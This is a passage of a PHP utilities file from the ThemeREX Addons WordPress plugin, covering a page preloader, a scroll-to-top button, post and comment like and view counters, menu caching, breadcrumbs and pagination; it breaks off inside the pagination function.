<?php
/**
 * WordPress utilities
 *
 * @package WordPress
 * @subpackage ThemeREX Addons
 * @since v1.0
 */

// Don't load directly
if ( ! defined( 'TRX_ADDONS_VERSION' ) ) {
	die( '-1' );
}


/* Page preloader
------------------------------------------------------------------------------------- */

// Add plugin specific classes to the body tag
if ( !function_exists('trx_addons_body_classes') ) {
	add_filter( 'body_class', 'trx_addons_body_classes' );
	function trx_addons_body_classes( $classes ) {
		if (!trx_addons_is_off(trx_addons_get_option('page_preloader')))
			$classes[] = 'preloader';
		if (is_front_page() && get_option('show_on_front')=='page' && get_option('page_on_front')>0)
			$classes[] = 'frontpage';
		return $classes;
	}
}

// Add page preloader into body
if (!function_exists('trx_addons_add_page_preloader')) {
	add_action('wp_footer', 'trx_addons_add_page_preloader', 1);
	function trx_addons_add_page_preloader() {
		if ( ($preloader=trx_addons_get_option('page_preloader')) != 'none' && ( $preloader != 'custom' || ($image=trx_addons_get_option('page_preloader_image')) != '')) {
			?><div id="page_preloader"><?php
				if ($preloader == 'circle') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_circ1"></div><div class="preloader_circ2"></div><div class="preloader_circ3"></div><div class="preloader_circ4"></div></div><?php
				} else if ($preloader == 'square') {
					?><div class="preloader_wrap preloader_<?php echo esc_attr($preloader); ?>"><div class="preloader_square1"></div><div class="preloader_square2"></div></div><?php
				}
			?></div><?php
		}
	}
}

// Add page preloader styles into head
if (!function_exists('trx_addons_add_page_preloader_styles')) {
	add_action('wp_head', 'trx_addons_add_page_preloader_styles');
	function trx_addons_add_page_preloader_styles() {
		if (($preloader=trx_addons_get_option('page_preloader'))!='none') {
			$image = trx_addons_get_option('page_preloader_image');
			$bg_color = trx_addons_get_option('page_preloader_bg_color');
			if (!empty($bg_color)) $bg_color = 'background-color:' . esc_attr($bg_color) . ';';
			?>
			<style type="text/css">
			<!--
				#page_preloader {
					<?php
					if (!empty($bg_color)) {
						?>background-color: <?php echo esc_attr($bg_color); ?>;<?php
					}
					if ($preloader=='custom' && $image) {
						?>background-image: url(<?php echo esc_url($image); ?>);<?php
					}
					?>
				}
			-->
			</style>
			<?php
		}
	}
}



/* Scroll to top button
------------------------------------------------------------------------------------- */

// Add button into body
if (!function_exists('trx_addons_add_scroll_to_top')) {
	add_action('wp_footer', 'trx_addons_add_scroll_to_top', 100);
	function trx_addons_add_scroll_to_top() {
		if (trx_addons_is_on(trx_addons_get_option('scroll_to_top'))) {
			?><a href="#" class="trx_addons_scroll_to_top trx_addons_icon-up" title="<?php esc_attr_e('Scroll to top', 'trx_addons'); ?>"></a><?php
		}
	}
}



/* Post views and likes
-------------------------------------------------------------------------------- */

//Return Post Views number
if (!function_exists('trx_addons_get_post_views')) {
	function trx_addons_get_post_views($id=0){
		if (!$id) 
			$id = trx_addons_get_the_ID();
		if ($id) {
			$count_key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $count_key, true);
			if ($count===''){
				delete_post_meta($id, $count_key);
				add_post_meta($id, $count_key, '0');
				$count = 0;
			}
		} else
			$count = 0;
		return $count;
	}
}

//Set Post Views number
if (!function_exists('trx_addons_set_post_views')) {
	function trx_addons_set_post_views($id=0, $counter=-1) {
		if (!$id) 
			$id = trx_addons_get_the_ID();
		if ($id) {
			$count_key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $count_key, true);
			if ($count===''){
				delete_post_meta($id, $count_key);
				add_post_meta($id, $count_key, 1);
			} else {
				$count = $counter >= 0 ? $counter : $count+1;
				update_post_meta($id, $count_key, $count);
			}
		}
	}
}

// Increment Post Views number
if (!function_exists('trx_addons_inc_post_views')) {
	function trx_addons_inc_post_views($id=0, $inc=0) {
		if (!$id) 
			$id = trx_addons_get_the_ID();
		if ($id) {
			$count_key = 'trx_addons_post_views_count';
			$count = get_post_meta($id, $count_key, true);
			if ($count===''){
				$count = max(0, $inc);
				delete_post_meta($id, $count_key);
				add_post_meta($id, $count_key, $count);
			} else {
				$count += $inc;
				update_post_meta($id, $count_key, $count);
			}
		} else
			$count = 0;
		return $count;
	}
}

//Return Post Likes number
if (!function_exists('trx_addons_get_post_likes')) {
	function trx_addons_get_post_likes($id=0){
		if (!$id) 
			$id = trx_addons_get_the_ID();
		if ($id) {
			$count_key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $count_key, true);
			if ($count===''){
				delete_post_meta($id, $count_key);
				add_post_meta($id, $count_key, '0');
				$count = 0;
			}
		} else
			$count = 0;
		return $count;
	}
}

//Set Post Likes number
if (!function_exists('trx_addons_set_post_likes')) {
	function trx_addons_set_post_likes($id=0, $counter=-1) {
		if (!$id) 
			$id = trx_addons_get_the_ID();
		if ($id) {
			$count_key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $count_key, true);
			if ($count===''){
				delete_post_meta($id, $count_key);
				add_post_meta($id, $count_key, 1);
			} else {
				$count = $counter >= 0 ? $counter : $count+1;
				update_post_meta($id, $count_key, $count);
			}
		}
	}
}

// Increment Post Likes number
if (!function_exists('trx_addons_inc_post_likes')) {
	function trx_addons_inc_post_likes($id=0, $inc=0) {
		if (!$id) 
			$id = trx_addons_get_the_ID();
		if ($id) {
			$count_key = 'trx_addons_post_likes_count';
			$count = get_post_meta($id, $count_key, true);
			if ($count===''){
				$count = max(0, $inc);
				delete_post_meta($id, $count_key);
				add_post_meta($id, $count_key, $count);
			} else {
				$count += $inc;
				update_post_meta($id, $count_key, $count);
			}
		} else
			$count = $inc;
		return $count;
	}
}


// Set post likes/views counters when save/publish post
if ( !function_exists( 'trx_addons_init_post_counters' ) ) {
	add_action('save_post',	'trx_addons_init_post_counters');
	function trx_addons_init_post_counters($id) {
		global $post_type, $post;
		// check autosave
		if (defined('DOING_AUTOSAVE') && DOING_AUTOSAVE) {
			return $id;
		}
		// check permissions
		if (empty($post_type) || !current_user_can('edit_'.$post_type, $id)) {
			return $id;
		}
		if ( !empty($post->ID) && $id==$post->ID ) {
			trx_addons_get_post_views($id);
			trx_addons_get_post_likes($id);
		}
	}
}


// AJAX: Set post likes/views number
if ( !function_exists( 'trx_addons_callback_post_counter' ) ) {
	add_action('wp_ajax_post_counter', 			'trx_addons_callback_post_counter');
	add_action('wp_ajax_nopriv_post_counter',	'trx_addons_callback_post_counter');
	function trx_addons_callback_post_counter() {
		
		if ( !wp_verify_nonce( trx_addons_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			die();
	
		$response = array('error'=>'', 'counter' => 0);
		
		$id = (int) $_REQUEST['post_id'];
		if (isset($_REQUEST['likes'])) {
			$response['counter'] = trx_addons_inc_post_likes($id, (int) $_REQUEST['likes']);
		} else if (isset($_REQUEST['views'])) {
			$response['counter'] = trx_addons_inc_post_views($id, (int) $_REQUEST['views']);
		}
		echo json_encode($response);
		die();
	}
}


// Increment views counter via AJAX
if ( !function_exists( 'trx_addons_inc_views_ajax' ) ) {
	add_filter("trx_addons_localize_script", 'trx_addons_add_views_vars');
	function trx_addons_add_views_vars($vars) {
		$vars['ajax_views'] = (int) trx_addons_get_option('ajax_views') == 1 && is_singular();
		return $vars;
	}
}

// Increment views counter via PHP
if ( !function_exists( 'trx_addons_inc_views_php' ) ) {
	add_action("wp_head", 'trx_addons_inc_views_php');
	function trx_addons_inc_views_php() {
		if ((int) trx_addons_get_option('ajax_views') == 0) trx_addons_inc_post_views(get_the_ID(), 1);
	}
}


// Return post likes/views counter layout
if ( !function_exists( 'trx_addons_get_post_counters' ) ) {
	function trx_addons_get_post_counters($counters='views', $show=false) {
		$post_id = get_the_ID();
		$output = '';
		$components = explode(',', $counters);
		foreach ($components as $comp) {
			if ($comp == 'comments') {
				if (!is_singular() || have_comments() || comments_open()) {
					$post_comments = get_comments_number();
					$output .= ' <a href="'.esc_url(get_comments_link()).'" class="post_counters_item post_counters_comments trx_addons_icon-comment">'
									. '<span class="post_counters_number">'	. trim($post_comments) . '</span>'
                        . '<span class="post_counters_label">' . (1==$post_comments ? esc_html__('Comment', 'trx_addons') : esc_html__('Comments', 'trx_addons')) . '</span>'
                        .'</a> ';
				}
			} else if ($comp == 'views') {
				$post_views = trx_addons_get_post_views($post_id);
				$output .= ' <a href="' . esc_url(get_permalink()) . '" class="post_counters_item post_counters_views trx_addons_icon-eye">'
								. '<span class="post_counters_number">' . trim($post_views) . '</span>'
                    . '<span class="post_counters_label">' . (1==$post_views ? esc_html__('View', 'trx_addons') : esc_html__('Views', 'trx_addons')) . '</span>'
                    . '</a> ';
			} else if ($comp == 'likes') {
				$post_likes = trx_addons_get_post_likes($post_id);
				$likes = isset($_COOKIE['trx_addons_likes']) ? $_COOKIE['trx_addons_likes'] : '';
				$allow = strpos($likes, ','.($post_id).',')===false;
				$output .= ' <a href="#" class="post_counters_item post_counters_likes trx_addons_icon-heart'.(!empty($allow) ? '-empty enabled' : ' disabled').'"
					title="'.(!empty($allow) ? esc_attr__('Like', 'trx_addons') : esc_attr__('Dislike', 'trx_addons')).'"
					data-postid="' . esc_attr($post_id) . '"
					data-likes="' . esc_attr($post_likes) . '"
					data-title-like="' . esc_attr__('Like', 'trx_addons') . '"
					data-title-dislike="' . esc_attr__('Dislike', 'trx_addons') . '">'
						. '<span class="post_counters_number">' . trim($post_likes) . '</span>'
						. '<span class="post_counters_label">' . (1==$post_likes ? esc_html__('Like', 'trx_addons') : esc_html__('Likes', 'trx_addons')) . '</span>'
					. '</a> ';
			}
		}
		if ($show) trx_addons_show_layout($output);
		return $output;
	}
}



/* Comment's likes
-------------------------------------------------------------------------------- */

//Return Comment's Likes number
if (!function_exists('trx_addons_get_comment_likes')) {
	function trx_addons_get_comment_likes($id=0){
		if (!$id) $id = get_comment_ID();
		$count_key = 'trx_addons_comment_likes_count';
		$count = get_comment_meta($id, $count_key, true);
		if ($count===''){
			delete_comment_meta($id, $count_key);
			add_comment_meta($id, $count_key, '0');
			$count = 0;
		}
		return $count;
	}
}

//Set Comment's Likes number
if (!function_exists('trx_addons_set_comment_likes')) {
	function trx_addons_set_comment_likes($id=0, $counter=-1) {
		if (!$id) $id = get_comment_ID();
		$count_key = 'trx_addons_comment_likes_count';
		$count = get_post_meta($id, $count_key, true);
		if ($count===''){
			delete_comment_meta($id, $count_key);
			add_comment_meta($id, $count_key, 1);
		} else {
			$count = $counter >= 0 ? $counter : $count+1;
			update_comment_meta($id, $count_key, $count);
		}
	}
}

// Increment Post Likes number
if (!function_exists('trx_addons_inc_comment_likes')) {
	function trx_addons_inc_comment_likes($id=0, $inc=0) {
		if (!$id) $id = get_comment_ID();
		$count_key = 'trx_addons_comment_likes_count';
		$count = get_comment_meta($id, $count_key, true);
		if ($count===''){
			$count = max(0, $inc);
			delete_comment_meta($id, $count_key);
			add_comment_meta($id, $count_key, $count);
		} else {
			$count += $inc;
			update_comment_meta($id, $count_key, $count);
		}
		return $count;
	}
}


// Set comment likes counter when save/publish post
if ( !function_exists( 'trx_addons_init_comment_counters' ) ) {
	add_action('comment_post',	'trx_addons_init_comment_counters', 10, 2);
	function trx_addons_init_comment_counters($id, $status='') {
		if ( !empty($id) ) {
			trx_addons_get_comment_likes($id);
		}
	}
}


// AJAX: Set comment likes number
if ( !function_exists( 'trx_addons_callback_comment_counter' ) ) {
	add_action('wp_ajax_comment_counter', 		'trx_addons_callback_comment_counter');
	add_action('wp_ajax_nopriv_comment_counter','trx_addons_callback_comment_counter');
	function trx_addons_callback_comment_counter() {
		
		if ( !wp_verify_nonce( trx_addons_get_value_gp('nonce'), admin_url('admin-ajax.php') ) )
			die();
	
		$response = array('error'=>'', 'counter' => 0);
		
		$id = (int) $_REQUEST['post_id'];
		if (isset($_REQUEST['likes'])) {
			$response['counter'] = trx_addons_inc_comment_likes($id, (int) $_REQUEST['likes']);
		}
		echo json_encode($response);
		die();
	}
}


// Return post likes/views counter layout
if ( !function_exists( 'trx_addons_get_comment_counters' ) ) {
	function trx_addons_get_comment_counters($counters='likes', $show=false) {
		$comment_id = get_comment_ID();
		$output = '';
		if (strpos($counters, 'likes')!==false) {
			$comment_likes = trx_addons_get_comment_likes($comment_id);
			$likes = isset($_COOKIE['trx_addons_comment_likes']) ? $_COOKIE['trx_addons_comment_likes'] : '';
			$allow = strpos($likes, ','.($comment_id).',')===false;
			$output .= '<a href="#" class="comment_counters_item comment_counters_likes trx_addons_icon-heart'.(!empty($allow) ? '-empty enabled' : ' disabled').'"
				title="'.(!empty($allow) ? esc_attr__('Like', 'trx_addons') : esc_attr__('Dislike', 'trx_addons')).'"
				data-commentid="' . esc_attr($comment_id) . '"
				data-likes="' . esc_attr($comment_likes) . '"
				data-title-like="' . esc_attr__('Like', 'trx_addons') . '"
				data-title-dislike="' . esc_attr__('Dislike', 'trx_addons') . '">'
					. '<span class="comment_counters_number">' . trim($comment_likes) . '</span>'
					. '<span class="comment_counters_label">' . esc_html__('Likes', 'trx_addons') . '</span>'
				. '</a>';
		}
		if ($show) trx_addons_show_layout($output);
		return $output;
	}
}
		



/* Widgets utilities
------------------------------------------------------------------------------------- */

// Prepare widgets args - substitute id and class in parameter 'before_widget'
if (!function_exists('trx_addons_prepare_widgets_args')) {
	function trx_addons_prepare_widgets_args($args, $id, $class) {
		if (!empty($args['before_widget'])) $args['before_widget'] = str_replace(array('%1$s', '%2$s'), array($id, $class), $args['before_widget']);
		return $args;
	}
}
		



/* Menu utilities
------------------------------------------------------------------------------------- */

// Return nav menu html
if ( !function_exists( 'trx_addons_get_nav_menu' ) ) {
	function trx_addons_get_nav_menu($location='', $menu='', $depth=11, $custom_walker=false) {
		static $list = array();
		$slug = $location.'_'.$menu;
		if (empty($list[$slug])) {
			$args = array(
					'menu'				=> empty($menu) || $menu=='default' || trx_addons_is_inherit($menu) ? '' : $menu,
					'container'			=> '',
					'container_class'	=> '',
					'container_id'		=> '',
					'items_wrap'		=> '<ul id="%1$s" class="%2$s">%3$s</ul>',
					'menu_class'		=> 'sc_layouts_menu_nav' . (!empty($location) ? ' '.$location.'_nav' : ''),
					'menu_id'			=> (!empty($location) ? $location : ''),
					'echo'				=> false,
					'fallback_cb'		=> '',
					'before'			=> '',
					'after'				=> '',
					'link_before'       => '<span>',
					'link_after'        => '</span>',
					'depth'             => $depth
					);
			if (!empty($location))
				$args['theme_location'] = $location;
			if ($custom_walker && class_exists('trx_addons_custom_menu_walker'))
				$args['walker'] = new trx_addons_custom_menu_walker;
			// Remove empty spaces between items
			$list[$slug] = preg_replace(array("/>[\r\n\s]*<li/", "/>[\r\n\s]*<\\/ul>/"),
										array("><li", "></ul>"),
										wp_nav_menu(apply_filters('trx_addons_filter_get_nav_menu_args', $args))
										);
		}
		return apply_filters('trx_addons_filter_get_nav_menu', $list[$slug], $location, $menu);
	}
}

// Add menu to the cache
if ( !function_exists( 'trx_addons_add_menu_cache' ) ) {
	add_action('wp_nav_menu', 'trx_addons_add_menu_cache', 100, 2);
	function trx_addons_add_menu_cache($html='', $args=array()) {
		if (trx_addons_is_on(trx_addons_get_option('menu_cache')) && !trx_addons_exists_wpml()) {
			$menu_cache = 'trx_addons_menu_'.get_option('stylesheet');
			$list = get_transient($menu_cache);
			if (empty($list)) $list = array();
			$menu = !empty($args->theme_location) 
						? $args->theme_location 
						: (!empty($args->menu) 
								? (!empty($args->menu->slug)
										? $args->menu->slug
										: $args->menu
									)
								: 'default'
							);
			$list[$menu] = $html;
			set_transient($menu_cache, $list, 60*60);
		}
		return $html;
	}
}

// Clear cache with saved menu
if ( !function_exists( 'trx_addons_clear_menu_cache' ) ) {
	add_action('wp_update_nav_menu', 'trx_addons_clear_menu_cache', 10, 2);
	function trx_addons_clear_menu_cache($menu_id=0, $menu_data=array()) {
		delete_transient('trx_addons_menu_'.get_option('stylesheet'));
	}
}

// Return menu from the cache
if ( !function_exists( 'trx_addons_get_menu_cache' ) ) {
	add_action('pre_wp_nav_menu', 'trx_addons_get_menu_cache', 100, 2);
	function trx_addons_get_menu_cache($html, $args) {
		if (trx_addons_is_on(trx_addons_get_option('menu_cache')) && !trx_addons_exists_wpml()) {
			$menu_cache = 'trx_addons_menu_'.get_option('stylesheet');
			$list = get_transient($menu_cache);
			$menu = !empty($args->theme_location) 
						? $args->theme_location
						: (!empty($args->menu) 
								? (!empty($args->menu->slug)
										? $args->menu->slug
										: $args->menu
									)
								: 'default'
							);
			if (!empty($list[$menu])) {
				$html = $list[$menu];
				global $TRX_ADDONS_STORAGE;
				if (!isset($TRX_ADDONS_STORAGE['menu_cache'])) $TRX_ADDONS_STORAGE['menu_cache'] = array();
				$TRX_ADDONS_STORAGE['menu_cache'][] = !empty($args->menu_id) ? '#'.esc_attr($args->menu_id) : '.'.esc_attr($args->menu_class);
			}
		}
		return $html;
	}
}

// Add cached menu selectors to the js vars
if ( !function_exists( 'trx_addons_add_menu_cache_to_js' ) ) {
	add_filter('trx_addons_localize_script', 'trx_addons_add_menu_cache_to_js');
	function trx_addons_add_menu_cache_to_js($vars) {
		global $TRX_ADDONS_STORAGE;
		$vars['menu_cache'] = apply_filters('trx_addons_filter_menu_cache', !empty($TRX_ADDONS_STORAGE['menu_cache']) ? $TRX_ADDONS_STORAGE['menu_cache'] : array());
		return $vars;
	}
}



/* Breadcrumbs
------------------------------------------------------------------------------------- */

// Action handler to show breadcrumbs
if (!function_exists('trx_addons_action_breadcrumbs')) {
	add_action( 'trx_addons_action_breadcrumbs', 'trx_addons_action_breadcrumbs', 10, 2);
	function trx_addons_action_breadcrumbs($before='', $after='') {
		if (($fdir = trx_addons_get_file_dir('templates/tpl.breadcrumbs.php')) != '') {
			include $fdir;
		}
	}
}

// Show breadcrumbs path
if (!function_exists('trx_addons_get_breadcrumbs')) {
	function trx_addons_get_breadcrumbs($args=array()) {
		global $wp_query, $post;
		
		$args = array_merge( array(
			'home' => esc_html__('Home', 'trx_addons'),		// Home page title (if empty - not showed)
			'home_link' => '',								// Home page link
			'truncate_title' => 50,					// Truncate all titles to this length (if 0 - no truncate)
			'truncate_add' => '...',				// Append truncated title with this string
			'delimiter' => '<span class="breadcrumbs_delimiter"></span>',		// Delimiter between breadcrumbs items
			'max_levels' => trx_addons_get_option('breadcrumbs_max_level')		// Max categories in the path (0 - unlimited)
			), is_array($args) ? $args : array( 'home' => $args )
		);

		if ( is_front_page() ) return '';//is_home() || 

		if ( $args['max_levels']<=0 ) $args['max_levels'] = 999;
		$level = 1 + (isset($args['home']) && $args['home']!='' ? 1 : 0);	// Current element + Home
		
		$rez = $rez_all = $rez_parent = $rez_level = '';
		
		// Get link to the 'All posts (products, events, etc.)' page
		if ($level >= $args['max_levels'])
			$rez_level = '...';
		else {
			$rez_all = apply_filters('trx_addons_filter_get_blog_all_posts_link', '', $args);
			if (!empty($rez_all)) $level++;		// All posts
		}

		$cat = $parent_tax = '';
		$parent = $post_id = 0;

		// Get current post ID and path to current post/page/attachment ( if it have parent posts/pages )
		if (is_page() || is_attachment() || is_single()) {
			$page_parent_id = apply_filters('trx_addons_filter_get_parent_id', isset($wp_query->post->post_parent) ? $wp_query->post->post_parent : 0, isset($wp_query->post->ID) ? $wp_query->post->ID : 0);
			$post_id = (is_attachment() ? $page_parent_id : (isset($wp_query->post->ID) ? $wp_query->post->ID : 0));
			while ($page_parent_id > 0) {
				$page_parent = get_post($page_parent_id);
				if ($level >= $args['max_levels'])
					$rez_level = '...';
				else {
					$rez_parent = '<a class="breadcrumbs_item cat_post" href="' . esc_url(get_permalink($page_parent_id)) . '">' 
									. esc_html(trx_addons_strshort($page_parent->post_title, $args['truncate_title'], $args['truncate_add']))
									. '</a>' 
									. (!empty($rez_parent) ? $args['delimiter'] : '') 
									. ($rez_parent);
					$level++;
				}
				if (($page_parent_id = apply_filters('trx_addons_filter_get_parent_id', $page_parent->post_parent, $page_parent_id)) > 0) $post_id = $page_parent_id;
			}
		}
		// Show parents
		$step = 0;
		do {
			if ($step++ == 0) {
				if (is_single() || is_attachment()) {
					$post_type = get_post_type();
					if ($post_type == 'post') {
						$cats = get_the_category();
						$cat = !empty($cats[0]) ? $cats[0] : false;
					} else {
						$tax = trx_addons_get_post_type_taxonomy($post_type);
						if (!empty($tax)) {
							$cats = get_the_terms(get_the_ID(), $tax);
							$cat = !empty($cats[0]) ? $cats[0] : false;
						}
					}
					if ($cat) {
						if ($level >= $args['max_levels'])
							$rez_level = '...';
						else {
							$rez_parent = '<a class="breadcrumbs_item cat_post" href="'.esc_url(get_category_link($cat->term_id)).'">' 
											. esc_html(trx_addons_strshort($cat->name, $args['truncate_title'], $args['truncate_add']))
											. '</a>' 
											. (!empty($rez_parent) ? $args['delimiter'] : '') 
											. ($rez_parent);
							$level++;
						}
					}
				} else if ( is_category() ) {
					$cat_id = (int) get_query_var( 'cat' );
					if (empty($cat_id)) $cat_id = get_query_var( 'category_name' );
					$cat = get_term_by( (int) $cat_id > 0 ? 'id' : 'slug', $cat_id, 'category', OBJECT);
				} else if ( is_tag() ) {
					$cat = get_term_by( 'slug', get_query_var( 'post_tag' ), 'post_tag', OBJECT);
				} else if ( is_tax() ) {
					$tax = get_query_var('taxonomy');
					$cat = get_term_by( 'slug', get_query_var( $tax ), $tax, OBJECT);
				}
				if ($cat) {
					$parent = $cat->parent;
					$parent_tax = $cat->taxonomy;
				}
			}
			if ($parent) {
				$cat = get_term_by( 'id', $parent, $parent_tax, OBJECT);
				if ($cat) {
					$cat_link = get_term_link($cat->slug, $cat->taxonomy);
					if ($level >= $args['max_levels'])
						$rez_level = '...';
					else {
						$rez_parent = '<a class="breadcrumbs_item cat_parent" href="'.esc_url($cat_link).'">' 
										. esc_html(trx_addons_strshort($cat->name, $args['truncate_title'], $args['truncate_add']))
										. '</a>' 
										. (!empty($rez_parent) ? $args['delimiter'] : '') 
										. ($rez_parent);
						$level++;
					}
					$parent = $cat->parent;
				}
			}
		} while ($parent);

		$rez_parent = apply_filters('trx_addons_filter_get_parents_links', $rez_parent, $args);

		$rez_period = '';
		if ((is_day() || is_month()) && is_object($post)) {
			$year  = get_the_time('Y'); 
			$month = get_the_time('m'); 
			$rez_period = '<a class="breadcrumbs_item cat_parent" href="' . get_year_link( $year ) . '">' . ($year) . '</a>';
			if (is_day())
				$rez_period .= (!empty($rez_period) ? $args['delimiter'] : '') . '<a class="breadcrumbs_item cat_parent" href="' . esc_url(get_month_link( $year, $month )) . '">' . esc_html(get_the_date('F')) . '</a>';
		}

		if (!is_front_page()) {	// && !is_home()

			$title = trx_addons_get_blog_title();
			if (is_array($title)) $title = $title['text'];
			$title = trx_addons_strshort($title, $args['truncate_title'], $args['truncate_add']);

			$rez .= (isset($args['home']) && $args['home']!='' 
					? '<a class="breadcrumbs_item home" href="' . esc_url($args['home_link'] ? $args['home_link'] : home_url('/')) . '">' . ($args['home']) . '</a>' . ($args['delimiter']) 
					: '') 
				. (!empty($rez_all)    ? ($rez_all)    . ($args['delimiter']) : '')
				. (!empty($rez_level)  ? ($rez_level)  . ($args['delimiter']) : '')
				. (!empty($rez_parent) ? ($rez_parent) . ($args['delimiter']) : '')
				. (!empty($rez_period) ? ($rez_period) . ($args['delimiter']) : '')
				. ($title ? '<span class="breadcrumbs_item current">' . ($title) . '</span>' : '');
		}

		return apply_filters('trx_addons_filter_get_breadcrumbs', $rez);
	}
}

// Return link to the main posts page for the breadcrumbs
if ( !function_exists( 'trx_addons_get_blog_all_posts_link' ) ) {
	add_filter( 'trx_addons_filter_get_blog_all_posts_link', 'trx_addons_get_blog_all_posts_link', 10, 2);
	function trx_addons_get_blog_all_posts_link($link='', $args=array()) {
		if ($link=='') {
			if (trx_addons_is_posts_page() && !is_home())	//!is_post_type_archive('post'))
				$link = '<a href="'.esc_url(get_post_type_archive_link( 'post' )).'">'.esc_html__('All Posts', 'trx_addons').'</a>';
		}
		return $link;
	}
}

// Return true if it's 'posts' page
if ( !function_exists( 'trx_addons_is_posts_page' ) ) {
	function trx_addons_is_posts_page() {
		return !is_search()
					&& (
						(is_single() && get_post_type()=='post')
						|| is_category()
						);
	}
}

// Return blog title
if (!function_exists('trx_addons_get_blog_title')) {
	function trx_addons_get_blog_title() {
		if (is_front_page())
			$title = esc_html__( 'Home', 'trx_addons' );
		else if ( is_home() )
			$title = esc_html__( 'All Posts', 'trx_addons' );
		else if ( is_author() ) {
			$curauth = (get_query_var('author_name')) ? get_user_by('slug', get_query_var('author_name')) : get_userdata(get_query_var('author'));
			$title = sprintf(esc_html__('Author page: %s', 'trx_addons'), $curauth->display_name);
		} else if ( is_404() )
			$title = esc_html__('URL not found', 'trx_addons');
		else if ( is_search() )
			$title = sprintf( esc_html__( 'Search: %s', 'trx_addons' ), get_search_query() );
		else if ( is_day() )
			$title = sprintf( esc_html__( 'Daily Archives: %s', 'trx_addons' ), get_the_date() );
		else if ( is_month() )
			$title = sprintf( esc_html__( 'Monthly Archives: %s', 'trx_addons' ), get_the_date( 'F Y' ) );
		else if ( is_year() )
			$title = sprintf( esc_html__( 'Yearly Archives: %s', 'trx_addons' ), get_the_date( 'Y' ) );
		 else if ( is_category() )
			$title = sprintf( esc_html__( '%s', 'trx_addons' ), single_cat_title( '', false ) );
		else if ( is_tag() )
			$title = sprintf( esc_html__( 'Tag: %s', 'trx_addons' ), single_tag_title( '', false ) );
		else if ( is_tax() )
			$title = sprintf( esc_html__( '%s', 'trx_addons' ), single_term_title( '', false ) );
		else if ( is_attachment() )
			$title = sprintf( esc_html__( 'Attachment: %s', 'trx_addons' ), get_the_title());
		else if ( is_single() || is_page() )
			$title = get_the_title();
		else
			$title = get_the_title();	//get_bloginfo('name', 'raw');
		return apply_filters('trx_addons_filter_get_blog_title', $title);
	}
}



/* Blog pagination
------------------------------------------------------------------------------------- */

// Show simple pagination
if ( !function_exists('trx_addons_show_pagination') ) {
	function trx_addons_show_pagination($pagination='pages') {
		global $wp_query;
		// Pagination
		if ($pagination == 'pages') {
			the_posts_pagination( array(
				'mid_size'  => 2,
				'prev_text' => esc_html__( '<', 'trx_addons' ),
				'next_text' => esc_html__( '>', 'trx_addons' ),
				'before_page_number' => '<span class="meta-nav screen-reader-text">' . esc_html__( 'Page', 'trx_addons' ) . ' </span>',
			) );
		} else if ($pagination == 'links') {
			?>
			<div class="nav-links-old">
				<span class="nav-prev"><?php previous_posts_link( is_search() ? esc_html__('Previous posts', 'trx_addons') : esc_html__('Newest posts', 'trx_addons') ); ?></span>
				<span class="nav-next"><?php next_posts_link( is_search() ? esc_html__('Next posts', 'trx_addons') : esc_html__('Older posts', 'trx_addons'), $wp_query->max_num_pages ); ?></span>
			</div>
			<?php
		}
	}
}

// Show pagination with group pages: [1-10][11-20]...[24][25][26]...[31-40][41-45]
if (!function_exists('trx_addons_pagination')) {
	function trx_addons_pagination($args=array()) {
		$args = array_merge(array(
			'class' => '',				// Additional 'class' attribute for the pagination section
			'button_class' => '',		// Additional 'class' attribute for the each page button
			'base_link' => '',			// Base link for each page. If specified - all pages use it and add '&page=XX' to the end of this link. Else - use get_pagenum_link()
			'total_posts' => 0,			// Total posts number
			'posts_per_page' => 0,		// Posts per page
			'total_pages' => 0,			// Total pages (instead total_posts, otherwise - calculate number of pages)
			'cur_page' => 0,			// Current page
			'near_pages' => 2,			// Number of pages to be displayed before and after the current page
			'group_pages' => 10,		// How many pages in group
			'pages_text' => '', 		//__('Page %CURRENT_PAGE% of %TOTAL_PAGES%', 'trx_addons'),
			'cur_text' => "%PAGE_NUMBER%",
			'page_text' => "%PAGE_NUMBER%",
			'first_text'=> __('&laquo; First', 'trx_addons'),
			'last_text' => __("Last &raquo;", 'trx_addons'),
			'prev_text' => __("&laquo; Prev", 'trx_addons'),
			'next_text' => __("Next &raquo;", 'trx_addons'),
			'dot_text' => "&hellip;",
			'before' => '',
			'after' => ''
			),  is_array($args) ? $args 
				: (is_int($args) ? array( 'cur_page' => $args ) 		// If send number parameter - use it as offset
					: array( 'class' => $args )));						// If send string parameter - use it as 'class' name
		if (empty($args['before']))	$args['before'] = '<div class="trx_addons_pagination'.(!empty($args['class']) ? ' '.$args['class'] : '').'">';
		if (empty($args['after'])) 	$args['after'] = '</div>';
		
		extract($args);
		
		global $wp_query;
	
		// Detect total pages
		if ($total_pages == 0) {
			if ($total_posts == 0) $total_posts = $wp_query->found_posts;
			if ($posts_per_page == 0) $posts_per_page = (int) get_query_var('posts_per_page');
			$total_pages = ceil($total_posts / $posts_per_page);
		}
		
		if ($total_pages < 2) return;
		
		// Detect current page
		if ($cur_page == 0) {
			$cur_page = (int) get_query_var('paged');
			if ($cur_page == 0) $cur_page = (int) get_query_var('page');
			if ($cur_page <= 0) $cur_page = 1;
		}
		// Near pages
		$show_pages_start = $cur_page - $near_pages;
		$show_pages_end = $cur_page + $near_pages;
		// Current group
		$cur_group = ceil($cur_page / $group_pages);
	
		$output = $before;
	
		// Page XX from XXX
		if ($pages_text) {
			$pages_text = str_replace(
				array("%CURRENT_PAGE%", "%TOTAL_PAGES%"),
				array(number_format_i18n($cur_page),number_format_i18n($total_pages)),
				$pages_text);
			$output .= '<span class="'.esc_attr($class).'_pages '.$button_class.'">' . $pages_text . '</span>';
		}
		if ($cur_page > 1) {
			// First page
			$first_text = str_replace("%TOTAL_PAGES%", number_format_i18n($total_pages), $first_text);
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page=1' : get_pagenum_link()).'" data-page="1" class="'.esc_attr($class).'_first '.$button_class.'">'.$first_text.'</a>';
			// Prev page
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($cur_page-1) : get_pagenum_link($cur_page-1)).'" data-page="'.esc_attr($cur_page-1).'" class="'.esc_attr($class).'_prev '.$button_class.'">'.$prev_text.'</a>';
		}
		// Page buttons
		$group = 1;
		$dot1 = $dot2 = false;
		for ($i = 1; $i <= $total_pages; $i++) {
			if ($i % $group_pages == 1) {
				$group = ceil($i / $group_pages);
